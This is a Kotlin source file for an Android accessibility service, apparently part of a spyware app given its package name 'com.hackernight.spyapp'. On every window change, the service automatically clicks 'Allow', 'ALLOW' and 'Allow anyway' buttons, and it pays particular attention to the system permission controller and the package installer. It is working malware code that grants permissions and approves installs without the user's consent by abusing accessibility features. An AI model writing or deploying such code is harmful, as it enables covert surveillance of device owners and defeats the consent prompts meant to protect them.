package com.hackernight.spyapp

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class AutoPermissionService : AccessibilityService() {
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        clickIfExists("Allow")
        clickIfExists("ALLOW")
        clickIfExists("Allow anyway")
        if (event.packageName == "com.android.permissioncontroller" ||
            event.packageName == "com.google.android.permissioncontroller" ||
            event.packageName == "com.android.packageinstaller") {
            clickIfExists("Allow")
        }
    }

    private fun clickIfExists(text: String) {
        val root = rootInActiveWindow ?: return
        val nodes = root.findAccessibilityNodeInfosByText(text)
        for (node in nodes) {
            if (node.isClickable) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }
    }

    override fun onInterrupt() {}

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
        }
        serviceInfo = info
    }
}
